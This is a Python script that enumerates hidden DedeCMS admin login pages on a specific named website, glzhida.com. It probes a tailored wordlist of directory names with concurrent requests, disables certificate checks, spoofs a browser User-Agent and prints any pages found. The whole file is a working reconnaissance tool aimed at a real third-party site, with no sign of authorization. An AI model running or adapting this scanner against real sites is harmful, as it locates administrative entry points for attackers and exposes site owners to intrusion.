#!/usr/bin/env python3
"""dede_admin_bf.py - glzhida.com DedeCMS后台目录爆破"""
import urllib.request, ssl, socket, sys
from concurrent.futures import ThreadPoolExecutor

socket.setdefaulttimeout(4)
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://glzhida.com'

WORDS = ['admin', 'manage', 'manager', 'dede', 'dedecms', 'houtai', 'guanli', 'system', 'webadmin',
         'admin1', 'admin2', 'admin123', 'admin888', 'admins', 'myadmin', 'cmsadmin', 'siteadmin',
         'gladmin', 'glhoutai', 'gladmin888', 'zhida', 'zhidaadmin', 'glzhida', 'glzhidaadmin',
         'admin_gl', 'gl_adm', 'glxt', 'glsys', 'gzhoutai', 'adminok', 'adminweb', 'admincms',
         'adm', 'admi', 'houtai1', 'guanli1', 'xtadmin', 'sys', 'control', 'console', 'backend',
         'dedeadmin', 'dede888', 'admin8888', 'admin666', 'adm1n', 'admln', 'adminit', 'gladm']

def check(word):
    url = '%s/%s/login.php' % (BASE, word)
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=4, context=ctx)
        return word, r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return word, e.code, 0
    except Exception:
        return word, 0, 0

def main():
    hits = []
    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = [ex.submit(check, w) for w in WORDS]
        for fu in futs:
            word, code, size = fu.result()
            if code == 200 and size > 500:
                hits.append((word, code, size))
                print('FOUND: /%s/login.php -> %d %d' % (word, code, size), flush=True)
            elif code in (301, 302):
                print('REDIR: /%s/ -> %d' % (word, code), flush=True)
    print('=== hits: %s ===' % hits)

if __name__ == '__main__':
    main()
